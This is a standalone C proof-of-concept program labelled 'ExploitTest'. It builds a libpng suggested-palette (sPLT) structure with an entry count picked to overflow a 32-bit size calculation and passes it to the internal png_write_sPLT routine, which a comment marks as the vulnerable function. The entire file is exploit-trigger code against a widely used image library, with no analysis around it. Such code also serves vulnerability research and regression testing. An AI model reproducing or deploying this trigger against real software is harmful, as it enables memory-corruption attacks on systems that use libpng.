#include <stdio.h>
#include <stdlib.h>
#include <png.h>

extern void png_write_sPLT(png_structp png_ptr, const png_sPLT_t *spalette);

int main() {
    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        printf("Failed to create png_struct\n");
        return 1;
    }
    png_sPLT_t spalette;
    png_sPLT_entry *entries;
    size_t entry_size = 6; /* depth 8 */
    unsigned int nentries = (0xFFFFFFFF / entry_size) + 1;

    spalette.depth = 8;
    spalette.nentries = nentries;
    spalette.name = "ExploitTest";
    entries = (png_sPLT_entry *)malloc(nentries * sizeof(png_sPLT_entry));
    if (!entries) {
        printf("Failed to allocate entries\n");
        png_destroy_write_struct(&png_ptr, NULL);
        return 1;
    }
    spalette.entries = entries;

    // Initialize entries with dummy data
    for (unsigned int i = 0; i < nentries; i++) {
        entries[i].red = 0;
        entries[i].green = 0;
        entries[i].blue = 0;
        entries[i].alpha = 0;
        entries[i].frequency = 0;
    }

    // Call vulnerable function
    png_write_sPLT(png_ptr, &spalette);

    free(entries);
    png_destroy_write_struct(&png_ptr, NULL);
    return 0;
}
